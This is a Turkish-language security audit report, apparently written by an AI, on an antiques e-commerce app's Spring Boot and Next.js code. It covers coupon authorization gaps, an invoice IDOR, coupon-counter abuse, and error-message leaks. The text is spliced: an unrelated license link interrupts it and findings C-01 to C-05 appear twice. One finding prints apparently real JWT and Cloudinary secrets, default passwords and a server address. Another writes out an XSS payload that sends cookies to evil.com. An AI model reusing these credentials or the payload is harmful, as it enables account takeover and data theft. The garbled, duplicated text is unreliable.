`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

